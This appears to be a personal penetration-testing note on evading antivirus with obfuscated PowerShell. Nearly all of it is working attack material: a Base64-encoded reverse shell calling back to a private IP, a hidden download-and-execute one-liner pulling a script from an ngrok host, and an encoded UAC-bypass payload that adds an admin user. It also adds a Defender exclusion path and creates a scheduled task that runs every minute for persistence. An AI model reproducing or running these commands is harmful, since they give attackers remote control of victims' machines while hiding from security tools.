<https://www.youtube.com/watch?v=NdyThrkNUwE>

<https://github.com/gh0x0st/Invoke-PSObfuscation>

gedit 1.ps1

> [!NOTE]
> Payload below is Base64 encoded:
> 
> Simply go to: <https://www.base64decode.org/> to decode it. This is done because AV flagged it as malicous.

```Y2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCcxOTIuMTY4LjI1NS4xMzInLDQ0Myk7c3RyZWFtID0gY2xpZW50LkdldFN0cmVhbSgpO2J5dGVieXRlcyA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKGkgPSBzdHJlYW0uUmVhZChieXRlcywgMCwgYnl0ZXMuTGVuZ3RoKSkgLW5lIDApeztkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZyhieXRlcywwLCBpKTtzZW5kYmFjayA9IChpZXggIi4geyAkZGF0YSB9IDI+JjEiIHwgT3V0LVN0cmluZyApOyAkc2VuZGJhY2syID0gc2VuZGJhY2sgKyAiIyI7c2VuZGJ5dGUgPSAodGV4dC5lbmNvZGluZzo6QVNDSUkpLkdldEJ5dGVzKHNlbmRiYWNrMik7c3RyZWFtLldyaXRlKHNlbmRieXRlLDAsc2VuZGJ5dGUuTGVuZ3RoKTtzdHJlYW0uRmx1c2goKX07Y2xpZW50LkNsb3NlKCk=```

pwsh
. ./Invoke-PSObfuscation
Invoke-PSObfuscation -Path ./1.ps1 -Integers -Cmdlets -ShowChanges
Invoke-PSObfuscation -Path ./1.ps1 -All

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -WindowStyle Hidden IEX (iwr -usebasicparsing http://7.tcp.eu.ngrok.io:11101/obfuscated.ps1)http://192.168.255.132/obfuscated.ps1)

(Also remember to use the minimized window setting)
%systemroot%\system32\imageres.dll
%systemroot%\system32\notepad.exe


Powershell zipping:
Compress-Archive -Path .\personal.lnk -DestinationPath personal.zip
Expand-Archive -Path "C:\users\robert\downloads\personal.zip" -DestinationPath "C:\windows\tasks\"

===


UAC BYPASS
pwsh
. ./B64.ps1

B64 -encString "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -windowstyle hidden C:\users\ryan\desktop\personal.lnk"

$code = "bgBlAHQAIAB1AHMAZQByACAAYQBkAG0AaQBuACAAdABlAHMAdAAxADIAMwAgAC8AYQBkAGQA"

```
KG5Fdy1PQkpFQ3QgSW8uQ29NcHJlU3Npb24uREVmbGF0ZVNUckVhTShTeVN0ZW0uaW8ubWVtb1JZU1RSZWFNY29udkVyVDo6ZnJvbUJhU0U2NFNUcmlOZyggJ2hZNDlDOEl3R0lUL3lrdm9HanM0RmhlTHFJZ2ZVSFRLRXBwcksrU0xKRkw5OXpZRndVbVhtKzZlZTRyemNidGkzbzBJY1lEV0N6eEJmS1NCK01sZGN0Zzk4YzBUTGExZlhzWklITGFsb25VS3hLcUFucVJTeEhhSCtpb2ExNlZSQm9oYVQwMUVzWENtRjAzbWlyT0hGYTB6UmxyRnFGUlVUTTlVZHY4UUp2S0lsTzYyajZKK2hCdkN2R1laemZLK2MybzY4QWhadldxU0RJazNHdkRFSXkxbnZJSkd3azlKOWxINTNmMjJtU2R2JykgLFN5c1RFTS5pby5DT01wUmVzU2lvbi5jb01QUkVTU0lPTk1vREU6OkRlQ29tcHJlc3MgKSB8IEZvcmVhY0h7bkV3LU9CSkVDdCBJby5TdFJlYU1yRWFEZXIoICQsU3lTVEVNLnRlWFQuZW5DT2RJTkc6OmFTY2lJICl9KS5yRWFEVE9FbmQoICkgfCBJblZvS0UtZXhwUkVzc0lPTg==
```

EXCLUSION (Not actually needed, but can use B64 technique here too.)
Add-MpPreference -ExclusionPath "C:\Windows\tasks"

Persistance (dont run with elevated user):
copy "c:\users\ryan\desktop\personal.lnk" "c:\windows\tasks\personal.lnk"
schtasks /create /tn "soon" /sc minute /mo 1 /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -windowstyle hidden C:\windows\tasks\personal.lnk"


![unnamed_7c58e899dfe6441a8a281e227e7a4dbd](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Evasion/AV%20Evasion/powershell%20obfuscation%20(works)/powershell%20obfuscation%20(works)/{{notename}}-202605011506.png)
